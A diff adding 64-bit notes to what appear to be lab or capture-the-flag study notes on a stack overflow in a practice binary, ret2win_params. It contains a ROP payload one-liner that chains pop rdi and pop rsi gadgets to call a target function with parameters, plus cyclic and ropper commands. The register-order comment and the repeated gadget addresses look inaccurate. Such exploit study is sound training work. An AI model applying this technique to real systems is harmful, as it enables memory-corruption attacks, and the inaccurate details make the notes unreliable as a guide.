@@ -190,3 +190,18 @@ notes:
 EIP is where the 4 bytes of buffer starts
 ESP whatever left from the string (where we need to point to hacked function)
 ```
+
+### 64-bits
+```powershell
+#the register in 64-bits is in the following sequence rdi, rsi, rax
+#we need to store the parameters in the rdi and rsi registers. parameter_1 will be pointed to rdi registry which will be check in cmp1. parameter_2 will be pointed to rsi registry which will be check in cmp2
+
+# 1.check how many bytes u need for the register. then u need to populate the value in RSP
+cyclic 100
+
+# 2. you need to follow the following sequence --> padding + pop_rdi + param_1 + pop_rsi + param_2 + junk + hacked 
+python2 -c 'print "A" * 24 + "\x20\x50\x69\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x20\x50\x69\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x20\x50\x69\x00\x00\x00\x00\x00"' 
+
+#Note: to get the rdi & rsi path registry
+ropper --file ret2win_params --search "pop rdi"
+```
